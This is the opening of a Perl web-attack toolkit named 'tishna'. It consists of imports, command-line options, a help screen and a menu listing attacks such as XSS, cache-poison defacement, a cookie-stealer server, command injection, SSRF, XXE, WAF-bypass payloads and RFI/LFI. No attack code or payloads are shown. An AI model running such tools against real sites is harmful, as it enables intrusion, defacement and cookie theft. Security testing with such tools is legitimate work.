# *************************************************************************************** #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#                     Agreement between "Haroon Awan" and "You"(user).                    #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#  1. By using this piece of software your bound to these point.                          #
#  2. This an End User License Agreement (EULA) is a legal between a software application #
#     author "Haroon Awan" and (YOU) user of this software.                               #
#  3. This software application grants users rights to use for any purpose or modify and  #
#     redistribute creative works.                                                        #
#  4. This software comes in "is-as" warranty, author "Haroon Awan" take no responsbility #
#     what you do with by/this software as your free to use this software.                #
#  5. Any other purpose(s) that it suites as long as it is not related to any kind of     #
#     crime or using it in un-authorized environment.                                     #
#  6. You can use this software to protect and secure your data information in any        #
#     environment.                                                                        #
#  7. It can also be used in state of being protection against the unauthorized use of    #
#     information.                                                                        #
#  8. It can be used to take measures achieve protection.                                 #
# *************************************************************************************** #

#!/usr/bin/perl

use if $^O eq "MSWin32", Win32::Console::ANSI;
use HTML::LinkExtor;
use Data::Dumper;
$Data::Dumper::Indent=1;
use HTML::TreeBuilder;
use WWW::Mechanize;
use Term::ANSIColor;
#use Win32::Console::ANSI;
use Term::ANSIColor qw(:constants);
#use strict;
use v5.10;
use WWW::Mechanize::Firefox;
use WWW::Mechanize::TreeBuilder;
use HTTP::Cookies;
use HTML::XSSLint;
use Getopt::Long;
use LWP;
use HTML::LinkExtor;
use LWP::Simple;
use URI::URL;
use HTML::XSSLint;
use HTML::Form::XSS;
use WWW::Mechanize;
use CGI; 
use LWP::UserAgent;
use HTTP::Request::Common;
use Data::Dump qw/ddx/;
use WWW::Mechanize::Link;
use HTTP::Request;
use LWP::UserAgent;
use HTTP::Request::Common;
use HTTP::Status;
use HTML::Form;
use IO::Socket;
use URI::URL;
#use vars qw($opt_a $opt_b $opt_c $opt_d $opt_e $opt_f $opt_g $opt_h $opt_i $opt_j $opt_k $opt_l $opt_m $opt_o $opt_p $opt_q $opt_r $opt_s $opt_t $opt_u $opt_v $opt_w $opt_x $opt_y $opt_z $opt_A $opt_B $opt_C $opt_D $opt_E $opt_F $opt_G $opt_H $opt_I $opt_J $opt_K $opt_L $opt_M $opt_N $opt_O $opt_P);
#use Getopt::Std;
#getopts('a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:r:s:t:u:v:w:x:y:z');

#$|=1;

my $ua = LWP::UserAgent->new;
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


GetOptions(
    "h|help" => \$help,
    "a|audit=s" => \$audit,
    "b|extractresponsesheader=s" => \$extractresponsesheader,
    "c|extractimages=s" => \$extractimages,
    "d|extracturls=s" => \$extracturls,
    "e|identifyform=s" => \$identifyform,
    "f|findxssinforms=s" => \$findxssinforms,
    "g|findxssinweb=s" => \$findxssinweb,
    "h|wsmrsa=s" => \$wsmrsa,
    "i|headerinjectpoison=s" => \$headerinjectpoison,
    "j|cachepoisondefacer=s" => \$cachepoisondefacer,
    "k|crlfrsaf=s" => \$crlfrsaf,
    "l|httprsf=s" => \$httprsf,    
    "m|wcdac=s" => \$wcdac,
    "n|httpmethodsinformation" => \$httpmethodsinformation,
    "o|csrfinjection=s" => \$csrfinjection,
    "p|loadcsrfhtmltemplates=s" => \$loadcsrfhtmltemplates,
    "q|shellshock=s" => \$shellshock,
    "r|csrfat=s" => \$csrfat,
    "s|fahttpm=s" => \$fahttpm,
    "t|findxssinparameters=s" => \$findxssinparameters,
    "u|findmissinghttpsmethods=s" => \$findmissinghttpsmethods,
    "v|ssrf=s" => \$ssrf,
    "w|fahttpsmethods=s" => \$fahttpsmethods,
    "x|auditxmlrpc" => \$auditxmlrpc,
    "y|cookiestealer=s" => \$cookiestealer,
    "z|commandinection=s" => \$commandinection,
    "aa|showjson=s" => \$showjson,
    "ab|blindxxeinjection=s" => \$blindxxeinjection,
    "ac|fileupload=s" => \$fileupload,
    "ad|pssti=s" => \$pssti,
    "ae|jsonwebtoken=s" => \$jsonwebtoken,
    "af|pwebsocket=s" => \$pwebsocket,
    "ag|amazonbucket" => \$amazonbucket,
    "ah|extractcname=s" => \$extractcname,
    "ai|idorburp=s" => \$idorburp,
    "aj|performcsv=s" => \$performcsv,
    "ak|pxpath=s" => \$pxpath,
    "al|findbugs=s" => \$findbugs,
    "am|xpathsql=s" => \$xpathsql,
    "an|ffa=s" => \$ffa,
    "ao|mutatedxsspayloads=s" => \$mutatedxsspayloads,
    "ap|storedxsspayloads=s" => \$storedxsspayloads,
    "aq|reflectedxsspayloads=s" => \$reflectedxsspayloads,    
    "ar|wafbypass" => \$wafbypass,    
    "as|findxxsrs=s" => \$findxxsrs,
    "at|extractlinksa=s" => \$extractlinksa,
    "au|downloadlinksexif=s" => \$downloadlinksexif,
    "av|simplersa=s" => \$simplersa,
    "aw|doublersa=s" => \$doublersa,
    "ax|httpcachepoison=s" => \$httpcachepoison,
    "ay|httpcacheinject=s" => \$httpcacheinject,
    "az|httpfuzzer=s" => \$httpfuzzer,
    "aaa|ipobfuscating=s" => \$ipobfuscating,
    "aab|rfi=s" => \$rfi,
    "aac|lfi=s" => \$lfi,
    "aad|banar=s" => \$banar,
);

if ($help) { banner();help(); }
if ($audit) { banner();Audit(); }
if ($extractresponsesheader) { banner();Extractresponsesheader(); }
if ($extractimages) { banner();Extractimages(); }
if ($extracturls) { banner();Extracturls(); }
if ($identifyform) { banner();Identifyform(); }
if ($findxssinforms) { banner();Findxssinforms();}
if ($findxssinweb) { banner();Findxssinweb();}
if ($wsmrsa) { banner();Wsmrsa(); }
if ($headerinjectpoison) { banner();Headerinjectpoison(); }
if ($cachepoisondefacer) { banner();Cachepoisondefacer(); }
if ($crlfrsaf) { banner();Crlfrsaf(); }
if ($httprsf) { banner();Httprsf(); }
if ($wcdac) { banner();Wcdac(); }
if ($httpmethodsinformation) { banner();Httpmethodsinformation(); }
if ($csrfinjection) { banner();Csrfinjection(); }
if ($loadcsrfhtmltemplates) { banner();Loadcsrfhtmltemplates(); }
if ($shellshock) { banner();Shellshock(); }
if ($csrfat) { banner();Csrfat(); }
if ($fahttpm) { banner();Fahttpm(); }
if ($findxssinparameters) { banner();Findxssinparameters(); }
if ($findmissinghttpsmethods) { banner();Findmissinghttpsmethods(); }
if ($ssrf) { banner();Ssrf(); }
if ($fahttpsmethods) { banner();Fahttpsmethods(); }
if ($auditxmlrpc) { banner();Auditxmlrpc(); }
if ($cookiestealer) { banner();Cookiestealer(); }
if ($commandinection) { banner();Commandinjection();}
if ($showjson) { banner();Showjson();}
if ($blindxxeinjection) { banner();Blindxxeinjection(); }
if ($fileupload) { banner();Fileupload(); }
if ($pssti) { banner();Pssti(); }
if ($jsonwebtoken) { banner();Jsonwebtoken(); }
if ($pwebsocket) { banner();Pwebsocket(); }
if ($amazonbucket) { banner();Amazonbucket(); }
if ($extractcname) { banner();Extractcname(); }
if ($idorburp) { banner();Idorburp(); }
if ($performcsv) { banner();Performcsv(); }
if ($pxpath) { banner();Pxpath(); }
if ($findbugs) { banner();Findbugs(); }
if ($xpathsql) { banner();Xpathsql(); }
if ($ffa) { banner();Ffa();}
if ($mutatedxsspayloads) { banner();Mutatedxsspayloads();}
if ($storedxsspayloads) { banner();Storedxsspayloads(); }
if ($reflectedxsspayloads) { banner();Reflectedxsspayloads(); }
if ($wafbypass) { banner();Wafbypass(); }
if ($findxxsrs) { banner();Findxxsrs(); }
if ($extractlinksa) { banner();Extractlinksa(); }
if ($downloadlinksexif) { banner();Downloadlinksexif(); }
if ($simplersa) { banner();Simplersa(); }
if ($doublersa) { banner();Doublersa(); }
if ($httpcachepoison) { banner();Httpcachepoison(); }
if ($httpcacheinject) { banner();Httpcacheinject(); }
if ($httpfuzzer) { banner();Httpfuzzer(); }
if ($ipobfuscating) { banner();Ipobfuscating(); }
if ($rfi) { banner();Rfi(); }
if ($lfi) { banner();Lfi(); }
if ($banar) { banner();Banar(); }

unless (@ARGV > 1) { banner();menu(); }


#--------------------------------------------------------------#
#                            Help                              #
#--------------------------------------------------------------#
sub help {
    print line_u(),color('bold cyan'),"#                   ";
    print item('0'),"help ";
    print color('bold red'),"=> ";
    print color("bold white"),"tishna -hh site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('1'),"Audit HTTP Methods ";
    print color('bold red'),"=> ";
    print color("bold white"),"tishna -a site.com";
    print color('bold cyan'),"                   #   \n";
;
    print color('bold cyan'),"#                   ";
    print item('2'),"Extract Response Headers ";
    print color('bold red'),"=> ";
    print color("bold white"),"tishna -b site.com";
    print color('bold cyan'),"                   #   \n";
;
    print color('bold cyan'),"#                   ";
    print item('3'),"Extract Images ";
    print color('bold red'),"=> ";
    print color("bold white"),"tishna -c site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('4'),"Extract URLS ";
    print color('bold red'),"=> ";
    print color("bold white"),"tishna -d site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('5'),"Identify Forms ";
    print color('bold red'),"   => ";
    print color("bold white"),"tishna -e site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('6'),"Find XSS in Forms ";
    print color('bold red')," => ";
    print color("bold white"),"tishna -f site.com";
    print color('bold cyan'),"         #   \n";

    print color('bold cyan'),"#                   ";
    print item('7'),"Find XSS in Web ";
    print color('bold red'),"  => ";
    print color("bold white"),"tishna -g site.com";
    print color('bold cyan'),"                   #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('8'),"Web Server Mount Response Splitting Attack ";
    print color('bold red'),"  => ";
    print color("bold white"),"tishna -h site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('9'),"Header Inject Poison ";
    print color('bold red'),"  => ";
    print color("bold white"),"tishna -i site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('10'),"Cache Poison Defacer ";
    print color('bold red'),"  => ";
    print color("bold white"),"tishna -j site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('11'),"CRLF Response Splitting Attack & Fuzzer ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -k site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('12'),"HTTP Response Smuggling Fuzzing ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -l site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('13'),"Web Cache Deception Attack Check ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -m site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('14'),"HTTP Methods Information ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -n site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('15'),"CSRF Injection ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -o site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('16'),"Load CSRF HTML Templates ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -p site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('17'),"Shell Shock ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -q site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('18'),"Cross Site Request Forgery Audit Toolkit ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -r site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('19'),"Find Available HTTP Methods ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -s site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('20'),"Find XSS in Parameters using Screaming Cobra ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -t site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('21'),"Find Missing HTTPS Methods ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -u site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('22'),"Server Side Request Forgery ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -v site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('23'),"Find Available HTTPS Methods ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -w site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('24'),"Audit XML RPC Methods, Extract All Information ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -x site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('25'),"Cookie Stealer XSS Localhost Server ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -y site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('26'),"Command Inections Exploits ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -z site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('27'),"Show JSON Endpoint List ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -aa site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('28'),"Perform Blind,Encoded,Responsive XXE Injection ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -ab site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('29'),"Perform File Upload Injections ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -ac site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('30'),"Perform Side Side Template Injection ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -ad site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('31'),"Perform JSON Web Token Injection ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -ae site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('32'),"Perform Web Socket Injection ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -af site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('33'),"Perform Amazon Bucket Injection 101 aws amazon ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -ag site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('34'),"Extract Cnames Records for Hijacking ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -ah site.com";
    print color('bold cyan'),"                 #   \n";    
    
    print color('bold cyan'),"#                   ";
    print item('35'),"Insecure Direct Object Reference - BURP ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -ai site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('36'),"Perform CSV Injection ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -aj site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('37'),"Perform XPATH Injection ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -ak site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('38'),"Find SQL,XPATH,ASP,X,JAVA,JAVASCRIPT,PHP bugs ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -al site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('39'),"Find XPath and SQL Parameter Injection ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -am site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('40'),"Show TWO-Factor Authenitcation Payloads ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -an site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('41'),"Mutated XSS payloads ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -ao site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('42'),"Stored XSS payloads ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -ap site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('43'),"Reflected XSS payloads ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -aq site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('44'),"Waf Bypass payloads ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -ar site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('45'),"Find XSS Using Response Spliting ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -as site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('46'),"Extract Links - Advanced ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -at site.com";
    print color('bold cyan'),"                 #   \n";
        
    print color('bold cyan'),"#                   ";
    print item('47'),"Download Images - Exif Data ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -au site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('48'),"Simple Response Splitting Attack ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -av site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('49'),"Double Response Splitting Attack  ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -aw site.com";
    print color('bold cyan'),"                 #   \n";    
    
    print color('bold cyan'),"#                   ";
    print item('50'),"HTTP Cache Poison Attack ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -ax site.com";
    print color('bold cyan'),"                 #   \n";

    print color('bold cyan'),"#                   ";
    print item('51'),"HTTP Cache Inject Poison ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -ay site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('52'),"HTTP Fuzzer ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -az site.com";
    print color('bold cyan'),"                 #   \n";
    
    print color('bold cyan'),"#                   ";
    print item('53'),"IP Obfuscating ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -aaa site.com";
    print color('bold cyan'),"                 #   \n";
        
    print color('bold cyan'),"#                   ";
    print item('54'),"RFI ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -aab site.com";
    print color('bold cyan'),"                 #   \n";
        
    print color('bold cyan'),"#                   ";
    print item('55'),"LFI ";
    print color('bold red'),"        => ";
    print color("bold white"),"tishna -aac site.com";
    print color('bold cyan'),"                 #   \n";
    
    
#--------------------------------------------------------------#
#                           Banner                             #
#--------------------------------------------------------------#
sub banner {
    if ($^O =~ /MSWin32/) {system("mode con: cols=130 lines=40");system("cls"); }else { system("resize -s 40 130");system("clear"); }


print color('bold green'),"";
print qq {
	::::::::::::::: .::::::.   ::   .: :::.    :::.  :::.     
	;;;;;;;;'''';;;;;;`    `  ,;;   ;;,`;;;;,  `;;;  ;;`;;    
	     [[     [[['[==/[[[[,,[[[,,,[[[  [[[[[. '[[ ,[[ '[[,  
	     \$\$     \$\$\$  '''    \$"\$\$\$"""\$\$\$  \$\$\$ "Y\$c\$\$c\$\$\$cc\$\$\$c 
	     88,    888 88b    dP 888   "88o 888    Y88 888   888,
	     MMM    MMM  "YMmMY"  MMM    YMM MMM     YM YMM   ""` };
color("reset");
print "\n\n        \033[0;37m\033[0;31m [\033[1;34mArtificial Intelligence Based Web Security Swiss Knife\033[0;31m]  	  \n\n";
print color('bold cyan'),"	     		";print color('bold yellow on_red')," Programmer: Haroon Awan  "; print color('reset')," \n\n"; 
}
}

#--------------------------------------------------------------#
#                             Menu                             #
#--------------------------------------------------------------#
sub menu {
    print line_u(),color('bold cyan'),"	|  ";print color('reset'),item('1')," Audit HTTP Methods";print color('bold cyan'),"                             |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('2')," Extract Response Header";print color('bold cyan'),"                        |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('3')," Extract Images";print color('bold cyan'),"                                 |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('4')," Extract URLS";print color('bold cyan'),"                                   |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('5')," Identify Form";print color('bold cyan'),"                                  |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('6')," Find XSS in Forms";print color('bold cyan'),"                              |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('7')," Find XSS in Web";print color('bold cyan'),"                                |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('8')," Web Server Mount Response Splitting Attack";print color('bold cyan'),"     |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('9')," Header Inject Poison";print color('bold cyan'),"                           |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('10')," Cache Poison Defacer";print color('bold cyan'),"                          |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('11')," CRLF Response Splitting Attack & Fuzzer";print color('bold cyan'),"       |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('12')," HTTP Response Smuggling Fuzzing";print color('bold cyan'),"               |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('13')," Web Cache Deception Attack Check";print color('bold cyan'),"              |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('14')," HTTP Methods Information";print color('bold cyan'),"                      |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('15')," CSRF Injection";print color('bold cyan'),"                                |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('16')," Load CSRF HTML Templates";print color('bold cyan'),"                      |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('17')," Shell Shock";print color('bold cyan'),"                                   |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('18')," Cross Site Request Forgery Audit Toolkit	";print color('bold cyan'),"| \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('19')," Find Available HTTP Methods";print color('bold cyan'),"                   |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('20')," Find XSS in Parameters using Screaming Cobra";print color('bold cyan'),"  |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('21')," Find Missing HTTPS Methods";print color('bold cyan'),"                    |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('22')," Server Side Request Forgery";print color('bold cyan'),"                   |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('23')," Find Available HTTPS Methods";print color('bold cyan'),"                  |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('24')," Audit XML RPC Methods, Extract All Information";print color('bold cyan'),"|   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('25')," Cookie Stealer XSS Localhost Server";print color('bold cyan'),"           |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('26')," Command Inections Exploits";print color('bold cyan'),"                    |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('27')," Show JSON Endpoint List";print color('bold cyan'),"                       |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('28')," Perform Blind,Encoded,Responsive XXE Injection";print color('bold cyan'),"|   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('29')," Perform File Upload Injections";print color('bold cyan'),"                |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('30')," Perform Side Side Template Injection";print color('bold cyan'),"          |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('31')," Perform JSON Web Token Injection";print color('bold cyan'),"              |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('32')," Perform Web Socket Injection";print color('bold cyan'),"                  |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('33')," Perform Amazon Bucket Injection 101 aws amazon";print color('bold cyan'),"|   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('34')," Extract Cnames Records for Hijacking";print color('bold cyan'),"          |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('35')," Insecure Direct Object Reference - BURP";print color('bold cyan'),"       |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('36')," Perform CSV Injection";print color('bold cyan'),"                         |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('37')," Perform XPATH Injection";print color('bold cyan'),"                       |   \n";                        
    print color('bold cyan'),"	|  ";print color('reset'),item('38')," Find SQL,XPATH,ASP,X,JAVA,JAVASCRIPT,PHP bugs";print color('bold cyan')," |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('39')," Find XPath and SQL Parameter Injection";print color('bold cyan'),"        |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('40')," Show TWO-Factor Authenitcation Payloads";print color('bold cyan'),"       |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('41')," Mutated XSS payloads";print color('bold cyan'),"                          |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('42')," Stored XSS payloads";print color('bold cyan'),"                           |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('43')," Reflected XSS payloads";print color('bold cyan'),"                        |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('44')," Waf Bypass payloads ";print color('bold cyan'),"                          |   \n";                    
    print color('bold cyan'),"	|  ";print color('reset'),item('45')," Find XSS Using Response Spliting ";print color('bold cyan'),"             |   \n";
    print color('bold cyan'),"	|  ";print color('reset'),item('46')," Extract Links - Advanced ";print color('bold cyan'),"                     |   \n";    
    print color('bold cyan'),"	|  ";print color('reset'),item('47')," Download Images - Exif Data ";print color('bold cyan'),"                  |   \n";   
    print color('bold cyan'),"	|  ";print color('reset'),item('48')," Simple Response Splitting Attack ";print color('bold cyan'),"             |   \n";    
    print color('bold cyan'),"	|  ";print color('reset'),item('49')," Double Response Splitting Attack ";print color('bold cyan'),"             |   \n";   
    print color('bold cyan'),"	|  ";print color('reset'),item('50')," HTTP Cache Poison Attack ";print color('bold cyan'),"                     |   \n";   
    print color('bold cyan'),"	|  ";print color('reset'),item('51')," HTTP Cache Inject Poison ";print color('bold cyan'),"                     |   \n";   
    print color('bold cyan'),"	|  ";print color('reset'),item('52')," HTTP Fuzzer ";print color('bold cyan'),"                                  |   \n";    
    print color('bold cyan'),"	|  ";print color('reset'),item('53')," IP Obfuscating  ";print color('bold cyan'),"                              |   \n";   
    print color('bold cyan'),"	|  ";print color('reset'),item('54')," RFI ";print color('bold cyan'),"                                          |   \n";    
    print color('bold cyan'),"	|  ";print color('reset'),item('55')," LFI  ";print color('bold cyan'),"                                         |   \n";   
    print color('bold cyan'),"	|  ";print color('reset'),item('56')," Binary Buffer Overflow Finder  ";print color('bold cyan'),"               |   \n";      
    print color('bold cyan'),"	|  ";print color('reset'),item('0'),"Exit";print color('bold cyan'),"                                            |   \n",line_d();
    print color('bold green'),"\n\ntishna: _>  ";
    print color('reset');

    chomp($number=<STDIN>);

    if($number eq '1'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($audit=<STDIN>);
        print "\n";
        Audit();
        enter();
    }if($number eq '2'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($extractresponsesheader=<STDIN>);
        print "\n";
        Extractresponsesheader();
        enter();
    }if($number eq '3'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($extractimages=<STDIN>);
        print "\n";
        Extractimages();
        enter();
    }if($number eq '4'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($extracturls=<STDIN>);
        print "\n";
        Extracturls();
        enter();
    }if($number eq '5'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($identifyform=<STDIN>);
        print "\n";
        Identifyform();
        enter();
    }if($number eq '6'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($findxssinforms=<STDIN>);
        print "\n";
        Findxssinforms();
        enter();
    }if($number eq '7'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($findxssinweb=<STDIN>);
        print "\n";
        Findxssinweb();
        enter();
    }if($number eq '8'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($wsmrsa=<STDIN>);
        print "\n";
        Wsmrsa();
        enter();
    }if($number eq '9'){
        banner();
